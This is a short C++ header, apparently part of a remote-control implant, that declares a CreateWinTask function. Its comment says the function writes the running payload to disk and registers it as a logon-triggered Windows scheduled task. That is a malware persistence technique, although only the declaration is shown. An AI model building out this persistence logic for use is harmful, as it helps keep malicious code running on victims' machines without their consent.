// ========================================== { START OF FILE } ========================================== //
#pragma once

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands::exec {

    /// Puts the running payload on disk at <c>Command.Path</c> and registers it as a
    /// logon-triggered scheduled task named <c>Command.TaskName</c> (WIN_TASK).
    CommandResult CreateWinTask(const models::CheckinResponse& task);

}  // namespace agent::commands::exec
// ========================================== { END OF FILE } ========================================== //
